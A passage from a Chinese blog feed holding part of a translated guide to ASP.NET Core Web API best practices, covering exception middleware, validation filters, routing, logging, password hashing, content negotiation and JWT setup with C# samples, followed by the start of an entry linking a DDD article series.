<p>&emsp;&emsp;在上面的示例中，我们的 action 内部有一个 <code>try-catch</code> 代码块。这一点很重要，我们需要在我们的 action 方法体中处理所有的异常（包括未处理的）。一些开发者在 action 中使用 <code>try-catch</code> 代码块，这种方式明显没有任何问题。但我们希望 action 尽量保持简洁。因此，从我们的 action 中删除 <code>try-catch</code>，并将其放在一个集中的地方会是一种更好的方式。.NET Core 给我们提供了一种处理全局异常的方式，只需要稍加修改，就可以使用内置且完善的的中间件。我们需要做的修改就是在 <code>Startup</code> 类中修改 <code>Configure</code> 方法：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseExceptionHandler(config =&gt; </span><br><span class="line">    &#123;</span><br><span class="line">        config.Run(<span class="keyword">async</span> context =&gt; </span><br><span class="line">        &#123;</span><br><span class="line">            context.Response.StatusCode = <span class="number">500</span>;</span><br><span class="line">            context.Response.ContentType = <span class="string">"application/json"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> error = context.Features.Get&lt;IExceptionHandlerFeature&gt;();</span><br><span class="line">            <span class="keyword">if</span> (error != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> ex = error.Error;</span><br><span class="line">                <span class="keyword">await</span> context.Response.WriteAsync(<span class="keyword">new</span> ErrorModel</span><br><span class="line">                &#123;</span><br><span class="line">                    StatusCode = <span class="number">500</span>,</span><br><span class="line">                    ErrorMessage = ex.Message</span><br><span class="line">                &#125;.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line"></span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapControllers();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们也可以通过创建自定义的中间件来实现我们的自定义异常处理：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// You may need to install the Microsoft.AspNetCore.Http.Abstractions package into your project</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CustomExceptionMiddleware</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> RequestDelegate _next;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILogger&lt;CustomExceptionMiddleware&gt; _logger;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">CustomExceptionMiddleware</span>(<span class="params">RequestDelegate next, ILogger&lt;CustomExceptionMiddleware&gt; logger</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _next = next;</span><br><span class="line">        _logger = logger;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">async</span> Task <span class="title">Invoke</span>(<span class="params">HttpContext httpContext</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">await</span> _next(httpContext);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            _logger.LogError(<span class="string">"Unhandled exception...."</span>, ex);</span><br><span class="line">            <span class="keyword">await</span> HandleExceptionAsync(httpContext, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Task <span class="title">HandleExceptionAsync</span>(<span class="params">HttpContext httpContext, Exception ex</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">//todo</span></span><br><span class="line">        <span class="keyword">return</span> Task.CompletedTask;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Extension method used to add the middleware to the HTTP request pipeline.</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">CustomExceptionMiddlewareExtensions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IApplicationBuilder <span class="title">UseCustomExceptionMiddleware</span>(<span class="params"><span class="keyword">this</span> IApplicationBuilder builder</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">return</span> builder.UseMiddleware&lt;CustomExceptionMiddleware&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;之后，我们只需要将其注入到应用程序的请求管道中即可：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseCustomExceptionMiddleware();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="使用过滤器移除重复代码"><a href="#使用过滤器移除重复代码" class="headerlink" title="使用过滤器移除重复代码"></a>使用过滤器移除重复代码</h1><blockquote>
<p>USING ACTIONFILTERS TO REMOVE DUPLICATED CODE</p>
</blockquote>
<p>&emsp;&emsp;ASP.NET Core 的过滤器可以让我们在请求管道的特定状态之前或之后运行一些代码。因此如果我们的 action 中有重复验证的话，可以使用它来简化验证操作。<br>&emsp;&emsp;当我们在 action 方法中处理 PUT 或者 POST 请求时，我们需要验证我们的模型对象是否符合我们的预期。作为结果，这将导致我们的验证代码重复，我们希望避免出现这种情况，（基本上，我们应该尽我们所能避免出现任何代码重复。）我们可以在代码中通过使用 ActionFilter 来代替我们的验证代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ModelState.IsValid)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//bad request and logging logic</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们可以创建一个过滤器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ModelValidationAttribute</span> : <span class="title">ActionFilterAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">OnActionExecuting</span>(<span class="params">ActionExecutingContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!context.ModelState.IsValid)</span><br><span class="line">        &#123;</span><br><span class="line">            context.Result = <span class="keyword">new</span> BadRequestObjectResult(context.ModelState);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后在 <code>Startup</code> 类的 <code>ConfigureServices</code> 函数中将其注入：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services.AddScoped&lt;ModelValidationAttribute&gt;();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在，我们可以将上述注入的过滤器应用到我们的 action 中。  </p>
<h1 id="Microsoft-AspNetCore-All-元包"><a href="#Microsoft-AspNetCore-All-元包" class="headerlink" title="Microsoft.AspNetCore.All 元包"></a>Microsoft.AspNetCore.All 元包</h1><blockquote>
<p>MICROSOFT.ASPNETCORE.ALL META-PACKAGE</p>
</blockquote>
<p>&emsp;&emsp;注：如果你使用的是 2.1 和更高版本的 ASP.NET Core。建议使用 Microsoft.AspNetCore.App 包，而不是 Microsoft.AspNetCore.All。这一切都是出于安全原因。此外，如果使用 2.1 版本创建新的 WebAPI 项目，我们将自动获取 AspNetCore.App 包，而不是 AspNetCore.All。<br>&emsp;&emsp;这个元包包含了所有 AspNetCore 的相关包，EntityFrameworkCore 包，SignalR 包（version 2.1） 和依赖框架运行的支持包。采用这种方式创建一个新项目很方便，因为我们不需要手动安装一些我们可能使用到的包。<br>&emsp;&emsp;当然，为了能使用 Microsoft.AspNetCore.all 元包，需要确保你的机器安装了 .NET Core Runtime。  </p>
<h1 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h1><blockquote>
<p>ROUTING</p>
</blockquote>
<p>&emsp;&emsp;在 .NET Core Web API 项目中，我们应该使用属性路由代替传统路由，这是因为属性路由可以帮助我们匹配路由参数名称与 Action 内的实际参数方法。另一个原因是路由参数的描述，对我们而言，一个名为 “ownerId” 的参数要比 “id” 更加具有可读性。<br>&emsp;&emsp;我们可以使用 <code>[Route]</code> 属性来在控制器的顶部进行标注：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"api/[controller]"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Route(<span class="meta-string">"&#123;id&#125;"</span>)</span>]</span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;还有另一种方式为控制器和操作创建路由规则：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"api/owner"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">Route(<span class="meta-string">"&#123;id&#125;"</span>)</span>]</span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;对于这两种方式哪种会好一些存在分歧，但是我们经常建议采用第二种方式。这是我们一直在项目中采用的方式。<br>&emsp;&emsp;当我们谈论路由时，我们需要提到路由的命名规则。我们可以为我们的操作使用描述性名称，但对于 路由/节点，我们应该使用 NOUNS 而不是 VERBS。<br>&emsp;&emsp;一个较差的示例：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"api/owner"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">HttpGet(<span class="meta-string">"getAllOwners"</span>)</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetAllOwners</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpGet(<span class="meta-string">"getOwnerById/&#123;id&#125;"</span></span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;一个较好的示例：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">Route(<span class="meta-string">"api/owner"</span>)</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">OwnerController</span> : <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    [<span class="meta">HttpGet</span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetAllOwners</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="meta">HttpGet(<span class="meta-string">"&#123;id&#125;"</span></span>]</span><br><span class="line">    <span class="function"><span class="keyword">public</span> IActionResult <span class="title">GetOwnerById</span>(<span class="params">Guid id</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;更多关于 Restful 实践的细节解释，请查阅：<a href="https://code-maze.com/top-rest-api-best-practices/" target="_blank" rel="noopener">Top REST API Best Practices</a>  </p>
<h1 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h1><blockquote>
<p>LOGGING</p>
</blockquote>
<p>&emsp;&emsp;如果我们打算将我们的应用程序发布到生产环境，我们应该在合适的位置添加一个日志记录机制。在生产环境中记录日志对于我们梳理应用程序的运行很有帮助。<br>&emsp;&emsp;.NET Core 通过继承 <code>ILogger</code> 接口实现了它自己的日志记录。通过借助依赖注入机制，它可以很容易地使用。</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">TestController</span>: <span class="title">Controller</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> ILogger _logger;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TestController</span>(<span class="params">ILogger&lt;TestController&gt; logger</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _logger = logger;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，在我们的 action 中，我们可以通过使用 _logger 对象借助不同的日志级别来记录日志。<br>&emsp;&emsp;.NET Core 支持使用于各种日志记录的 Provider。因此，我们可能会在项目中使用不同的 Provider 来实现我们的日志逻辑。<br>&emsp;&emsp;NLog 是一个很不错的可以用于我们自定义的日志逻辑类库，它极具扩展性。支持结构化日志，且易于配置。我们可以将信息记录到控制台，文件甚至是数据库中。<br>&emsp;&emsp;想了解更多关于该类库在 .NET Core 中的应用，请查阅：<a href="https://code-maze.com/net-core-web-development-part3/" target="_blank" rel="noopener">.NET Core series – Logging With NLog</a><br>&emsp;&emsp;Serilog 也是一个很不错的类库，它适用于 .NET Core 内置的日志系统。  </p>
<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><blockquote>
<p>CRYPTOHELPER</p>
</blockquote>
<p>&emsp;&emsp;我们不会建议将密码以明文形式存储到数据库中。处于安全原因，我们需要对其进行哈希处理。这超出了本指南的内容范围。互联网上有大量哈希算法，其中不乏一些不错的方法来将密码进行哈希处理。<br>&emsp;&emsp;但是如果需要为 .NET Core 的应用程序提供易于使用的加密类库，CryptoHelper 是一个不错的选择。<br>&emsp;&emsp;CryptoHelper 是适用于 .NET Core 的独立密码哈希库，它是基于 PBKDF2 来实现的。通过创建 Data Protection 栈来将密码进行哈希化。这个类库在 NuGet 上是可用的，并且使用也很简单：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> CryptoHelper;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hash a password</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">string</span> <span class="title">HashPassword</span>(<span class="params"><span class="keyword">string</span> password</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Crypto.HashPassword(password);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Verify the password hash against the given password</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">bool</span> <span class="title">VerifyPassword</span>(<span class="params"><span class="keyword">string</span> hash, <span class="keyword">string</span> password</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Crypto.VerifyHashedPassword(hash, password);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="内容协商"><a href="#内容协商" class="headerlink" title="内容协商"></a>内容协商</h1><blockquote>
<p>CONTENT NEGOTIATION</p>
</blockquote>
<p>&emsp;&emsp;默认情况下，.NET Core Web API 会返回 JSON 格式的结果。大多数情况下，这是我们所希望的。<br>&emsp;&emsp;但是如果客户希望我们的 Web API 返回其它的响应格式，例如 XML 格式呢？<br>&emsp;&emsp;为了解决这个问题，我们需要进行服务端配置，用于按需格式化我们的响应结果：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddControllers().AddXmlSerializerFormatters();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;但有时客户端会请求一个我们 Web API 不支持的格式，因此最好的实践方式是对于未经处理的请求格式统一返回 <strong>406</strong> 状态码。这种方式也同样能在 <code>ConfigureServices</code> 方法中进行简单配置：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddControllers(options =&gt; options.ReturnHttpNotAcceptable = <span class="literal">true</span>).AddXmlSerializerFormatters();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们也可以创建我们自己的格式化规则。<br>&emsp;&emsp;这一部分内容是一个很大的主题，如果你希望了解更多，请查阅：<a href="https://code-maze.com/content-negotiation-dotnet-core/" target="_blank" rel="noopener">Content Negotiation in .NET Core</a>  </p>
<h1 id="使用-JWT"><a href="#使用-JWT" class="headerlink" title="使用 JWT"></a>使用 JWT</h1><blockquote>
<p>USING JWT</p>
</blockquote>
<p>&emsp;&emsp;现如今的 Web 开发中，JSON Web Tokens (JWT) 变得越来越流行。得益于 .NET Core 内置了对 JWT 的支持，因此实现起来非常容易。JWT 是一个开发标准，它允许我们以 JSON 格式在服务端和客户端进行安全的数据传输。<br>&emsp;&emsp;我们可以在 <code>ConfigureServices</code> 中配置 JWT 认证：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)</span><br><span class="line">        .AddJwtBearer(options =&gt; </span><br><span class="line">        &#123;</span><br><span class="line">            options.TokenValidationParameters = <span class="keyword">new</span> TokenValidationParameters</span><br><span class="line">            &#123;</span><br><span class="line">                ValidateIssuer = <span class="literal">true</span>,</span><br><span class="line">                ValidIssuer = _authToken.Issuer,</span><br><span class="line"></span><br><span class="line">                ValidateAudience = <span class="literal">true</span>,</span><br><span class="line">                ValidAudience = _authToken.Audience,</span><br><span class="line"></span><br><span class="line">                ValidateIssuerSigningKey = <span class="literal">true</span>,</span><br><span class="line">                IssuerSigningKey = <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_authToken.Key)),</span><br><span class="line"></span><br><span class="line">                RequireExpirationTime = <span class="literal">true</span>,</span><br><span class="line">                ValidateLifetime = <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">                <span class="comment">//others</span></span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;为了能在应用程序中使用它，我们还需要在 <code>Configure</code> 中调用下面一段代码：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    app.UseAuthentication();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此外，创建 Token 可以使用如下方式：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> securityToken = <span class="keyword">new</span> JwtSecurityToken(</span><br><span class="line">                claims: <span class="keyword">new</span> Claim[]</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">new</span> Claim(ClaimTypes.NameIdentifier,user.Id),</span><br><span class="line">                    <span class="keyword">new</span> Claim(ClaimTypes.Email,user.Email)</span><br><span class="line">                &#125;,</span><br><span class="line">                issuer: _authToken.Issuer,</span><br><span class="line">                audience: _authToken.Audience,</span><br><span class="line">                notBefore: DateTime.Now,</span><br><span class="line">                expires: DateTime.Now.AddDays(_authToken.Expires),</span><br><span class="line">                signingCredentials: <span class="keyword">new</span> SigningCredentials(</span><br><span class="line">                    <span class="keyword">new</span> SymmetricSecurityKey(Encoding.UTF8.GetBytes(_authToken.Key)),</span><br><span class="line">                    SecurityAlgorithms.HmacSha256Signature));</span><br><span class="line"></span><br><span class="line">Token = <span class="keyword">new</span> JwtSecurityTokenHandler().WriteToken(securityToken)</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;基于 Token 的用户验证可以在控制器中使用如下方式：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> auth = <span class="keyword">await</span> HttpContext.AuthenticateAsync();</span><br><span class="line"><span class="keyword">var</span> id = auth.Principal.Claims.FirstOrDefault(x =&gt; x.Type.Equals(ClaimTypes.NameIdentifier))?.Value;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们也可以将 JWT 用于授权部分，只需添加角色声明到 JWT 配置中即可。<br>&emsp;&emsp;更多关于 .NET Core 中 JWT 认证和授权部分，请查阅：<a href="https://code-maze.com/authentication-aspnetcore-jwt-1/" target="_blank" rel="noopener">authentication-aspnetcore-jwt-1</a> 和 <a href="https://code-maze.com/authentication-aspnetcore-jwt-2/" target="_blank" rel="noopener">authentication-aspnetcore-jwt-2</a>  </p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>&emsp;&emsp;读到这里，可能会有朋友对上述一些最佳实践不是很认同，因为全篇都没有谈及更切合项目的实践指南，比如 TDD 、DDD 等。但我个人认为上述所有的最佳实践是基础，只有把这些基础掌握了，才能更好地理解一些更高层次的实践指南。万丈高楼平地起，所以你可以把这看作是一篇面向新手的最佳实践指南。</p>
</blockquote>
<p>&emsp;&emsp;在这份指南中，我们的主要目的是让你熟悉关于使用 .NET Core 开发 Web API 项目时的一些最佳实践。这里面的部分内容在其它框架中也同样适用。因此，熟练掌握它们很有用。<br>&emsp;&emsp;非常感谢你能阅读这份指南，希望它能对你有所帮助。  </p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[如何运用领域驱动设计]]></title>
      <url>/2019/12/19/HowToUseDDD/</url>
      <content type="html"><![CDATA[<blockquote>
<p>待更新</p>
</blockquote>
<blockquote>
<p>值对象：<a href="https://www.cnblogs.com/uoyo/p/11951840.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/11951840.html</a><br>实体：<a href="https://www.cnblogs.com/uoyo/p/11984311.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/11984311.html</a><br>领域服务：<a href="https://www.cnblogs.com/uoyo/p/12023896.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12023896.html</a><br>聚合：<a href="https://www.cnblogs.com/uoyo/p/12061334.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12061334.html</a><br>存储库：<a href="https://www.cnblogs.com/uoyo/p/12097737.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12097737.html</a><br>工作单元：<a href="https://www.cnblogs.com/uoyo/p/12129344.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12129344.html</a>  </p>
</blockquote>
<blockquote>
<p>持久化领域对象的方法实践：<a href="https://www.cnblogs.com/uoyo/p/12167360.html" target="_blank" rel="noopener">https://www.cnblogs.com/uoyo/p/12167360.html</a></p>
</blockquote>
<blockquote>
